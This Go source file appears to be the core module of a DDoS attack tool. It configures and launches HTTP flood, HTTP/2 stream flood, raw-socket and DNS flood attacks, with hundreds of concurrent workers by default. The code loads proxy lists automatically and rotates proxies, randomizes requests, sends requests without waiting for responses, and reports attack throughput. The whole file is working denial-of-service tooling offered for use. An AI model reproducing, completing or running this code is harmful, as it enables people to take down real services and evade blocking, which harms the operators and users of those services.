package ddos

import (
	"context"
	"fmt"
	"sync/atomic"
	"time"
)

// New creates a new DDoS attack instance
func New(config DDoSConfig) *DDoSAttack {
	// Set defaults
	if config.Method == "" {
		config.Method = "GET"
	}
	if config.MaxThreads <= 0 {
		config.MaxThreads = 500
	}
	if config.Duration <= 0 {
		config.Duration = 60 * time.Second
	}
	if config.Timeout <= 0 {
		config.Timeout = 5 * time.Second
	}
	if config.AttackMode == "" {
		config.AttackMode = ModeFlood
	}
	if config.Headers == nil {
		config.Headers = make(map[string]string)
	}
	if config.MaxStreamsPerConn <= 0 {
		config.MaxStreamsPerConn = 1000 // Default HTTP/2 streams per connection (increased from 100)
	}

	// Set DNS defaults
	if config.AttackMode == ModeDNS {
		if config.DNSRandomSubdomains == false && len(config.DNSQueryTypes) == 0 {
			// Only set defaults if not explicitly configured
			config.DNSRandomSubdomains = true
		}
	}

	// Set default efficiency features (all enabled by default)
	// Only set defaults if all are false (zero values), meaning they weren't set
	// This allows explicit false values from menu configuration to be respected
	if !config.EnableConnectionPooling && !config.EnableFireAndForget && !config.EnableResponseBodySkipping && !config.EnableRequestRandomization {
		// All are false (zero values), so set defaults to true
		config.EnableConnectionPooling = true
		config.EnableFireAndForget = true
		config.EnableResponseBodySkipping = true
		config.EnableRequestRandomization = true
	}
	// Note: If any are explicitly set (including false), we respect those values
	// The menu code always sets these explicitly, so this is mainly a safety net

	// Auto-load proxies from default file if ProxyList is empty
	if len(config.ProxyList) == 0 {
		if proxies, err := loadProxiesFromFile(); err == nil && len(proxies) > 0 {
			config.ProxyList = proxies
			// Enable proxy rotation by default when proxies are auto-loaded
			if !config.RotateProxy {
				config.RotateProxy = true
			}
		}
	}

	if !config.RotateProxy && len(config.ProxyList) > 0 {
		config.RotateProxy = true // Default to true for load distribution
	}

	attack := &DDoSAttack{
		config: config,
	}

	// Initialize optimized proxy manager
	if len(config.ProxyList) > 0 {
		attack.proxyManager = NewProxyManager(config.ProxyList)
	}

	// Initialize rate limiter if rate limit is set
	if config.RateLimit > 0 {
		attack.rateLimiter = NewTokenBucket(config.RateLimit)
	}

	// User agents are handled by RequestBuilder (loaded when RequestBuilder is created)
	// No need to load them here since RequestBuilder manages its own user agent list

	return attack
}

// Start begins the DDoS attack
func (d *DDoSAttack) Start(ctx context.Context) error {
	d.mu.Lock()
	if d.running {
		d.mu.Unlock()
		return fmt.Errorf("attack already running")
	}
	d.running = true
	d.mu.Unlock()

	// Create cancellable context with timeout
	d.ctx, d.cancel = context.WithTimeout(ctx, d.config.Duration)
	d.startTime = time.Now()

	// Reset counters
	atomic.StoreInt64(&d.requestsSent, 0)
	atomic.StoreInt64(&d.requestsSuccess, 0)
	atomic.StoreInt64(&d.requestsFailed, 0)
	atomic.StoreInt64(&d.bytesSent, 0)
	atomic.StoreInt64(&d.bytesReceived, 0)
	atomic.StoreInt64(&d.activeConns, 0)
	atomic.StoreInt64(&d.totalResponseTime, 0)
	atomic.StoreInt64(&d.poolHits, 0)
	atomic.StoreInt64(&d.poolMisses, 0)
	atomic.StoreInt64(&d.totalBatches, 0)
	atomic.StoreInt64(&d.successfulBatches, 0)

	// Start progress reporter
	go d.reportProgress()

	// Ensure context is valid before starting workers
	if d.ctx == nil {
		return fmt.Errorf("failed to create attack context")
	}

	// Connection warm-up: pre-establish connections before starting attack
	// This improves initial throughput by having connections ready
	d.warmupConnections()

	// Start workers based on attack mode
	switch d.config.AttackMode {
	case ModeFlood:
		d.startFloodAttack()
	case ModeHTTP2:
		d.startHTTP2StreamFlood()
	case ModeRaw:
		d.startRawSocketAttack()
	case ModeDNS:
		d.startDNSFloodAttack()
	default:
		// Default to flood if unknown mode
		d.startFloodAttack()
	}

	return nil
}

// Wait waits for the attack to complete
func (d *DDoSAttack) Wait() {
	d.wg.Wait()

	// Cleanup resources
	d.cleanup()

	d.mu.Lock()
	d.running = false
	d.mu.Unlock()
}

// Stop stops the attack gracefully
func (d *DDoSAttack) Stop() {
	if d.cancel != nil {
		d.cancel()
	}
	// Wait for workers to finish and cleanup
	d.Wait()
}

// cleanup releases resources used by the attack
func (d *DDoSAttack) cleanup() {
	// Close client pool if it exists
	if pool, ok := d.clientPool.(*ClientPool); ok && pool != nil {
		pool.Close()
	}

	// Close global limiter if it exists (waits for all goroutines to complete)
	if d.globalLimiter != nil {
		d.globalLimiter.Close()
	}
}

// warmupConnections pre-establishes connections to improve initial throughput
func (d *DDoSAttack) warmupConnections() {
	// Only warm up for flood and HTTP/2 modes (they use connection pools)
	if d.config.AttackMode != ModeFlood && d.config.AttackMode != ModeHTTP2 {
		return
	}

	// Create connection pool early to establish connections
	pool, err := NewClientPool(d.config)
	if err != nil {
		return
	}
	d.clientPool = pool

	// Warm up by making a few test requests to establish connections
	// Use a small number to avoid delaying attack start
	warmupCount := 10
	if len(d.config.ProxyList) > 0 {
		// Warm up more connections when using proxies
		warmupCount = 20
	}

	// Create request builder for warm-up
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Perform warm-up requests in background (non-blocking)
	go func() {
		rb, ok := d.requestBuilder.(*RequestBuilder)
		if !ok || rb == nil {
			return
		}

		for i := 0; i < warmupCount; i++ {
			select {
			case <-d.ctx.Done():
				return
			default:
				client := pool.GetClient()
				if client == nil {
					continue
				}
				req, err := rb.BuildRequest()
				if err != nil {
					continue
				}
				req = req.WithContext(d.ctx)
				// Fire and forget warm-up request
				go func() {
					defer func() {
						if r := recover(); r != nil {
							// Ignore warm-up errors
						}
					}()
					client.Do(req)
				}()
			}
		}
	}()
}

// GetStats returns current attack statistics
func (d *DDoSAttack) GetStats() AttackStats {
	elapsed := time.Since(d.startTime)
	sent := atomic.LoadInt64(&d.requestsSent)
	totalRespTime := atomic.LoadInt64(&d.totalResponseTime)

	var avgRespTime time.Duration
	if sent > 0 {
		avgRespTime = time.Duration(totalRespTime / sent)
	}

	var rps float64
	if elapsed.Seconds() > 0 {
		rps = float64(sent) / elapsed.Seconds()
	}

	// Compute proxy health stats (optimized)
	activeProxies := 0
	disabledProxies := 0
	if d.proxyManager != nil {
		activeProxies = d.proxyManager.GetActiveProxies()
		disabledProxies = d.proxyManager.GetDisabledProxies()
	}

	// Calculate efficiency statistics
	poolHits := atomic.LoadInt64(&d.poolHits)
	poolMisses := atomic.LoadInt64(&d.poolMisses)
	totalPoolRequests := poolHits + poolMisses
	var poolHitRate float64
	if totalPoolRequests > 0 {
		poolHitRate = float64(poolHits) / float64(totalPoolRequests)
	}

	return AttackStats{
		RequestsSent:      sent,
		RequestsSuccess:   atomic.LoadInt64(&d.requestsSuccess),
		RequestsFailed:    atomic.LoadInt64(&d.requestsFailed),
		BytesSent:         atomic.LoadInt64(&d.bytesSent),
		BytesReceived:     atomic.LoadInt64(&d.bytesReceived),
		ActiveConnections: atomic.LoadInt64(&d.activeConns),
		AvgResponseTime:   avgRespTime,
		ElapsedTime:       elapsed,
		RequestsPerSec:    rps,
		ActiveProxies:     activeProxies,
		DisabledProxies:   disabledProxies,
		ConnectionsReused: poolHits,
		PoolHitRate:       poolHitRate,
	}
}

// getNextProxy returns the next healthy proxy for rotation, or false if none available.
// Uses optimized proxy manager for efficient selection and health tracking.
func (d *DDoSAttack) getNextProxy() (string, bool) {
	if d.proxyManager == nil {
		return "", false
	}
	return d.proxyManager.GetNextProxy()
}

// markProxyFailure records a failed request for the given proxy (optimized).
func (d *DDoSAttack) markProxyFailure(proxy string) {
	if d.proxyManager != nil {
		d.proxyManager.MarkFailure(proxy)
	}
}

// markProxySuccess records a successful request for the given proxy (optimized).
func (d *DDoSAttack) markProxySuccess(proxy string, responseTime time.Duration) {
	if d.proxyManager != nil {
		d.proxyManager.MarkSuccess(proxy, responseTime)
	}
}

// IsRunning returns whether the attack is currently running
func (d *DDoSAttack) IsRunning() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.running
}

// reportProgress periodically calls the progress callback
func (d *DDoSAttack) reportProgress() {
	defer func() {
		// Recover from panics in progress reporting
		if r := recover(); r != nil {
			// Silently recover to prevent crash
		}
	}()

	// Check if context is initialized
	if d.ctx == nil {
		return
	}

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-d.ctx.Done():
			// Final stats report
			if d.config.OnProgress != nil {
				// Recover from panics in callback
				func() {
					defer func() {
						if r := recover(); r != nil {
							// Silently recover to prevent crash
						}
					}()
					d.config.OnProgress(d.GetStats())
				}()
			}
			return
		case <-ticker.C:
			if d.config.OnProgress != nil {
				// Recover from panics in callback
				func() {
					defer func() {
						if r := recover(); r != nil {
							// Silently recover to prevent crash
						}
					}()
					d.config.OnProgress(d.GetStats())
				}()
			}
		}
	}
}
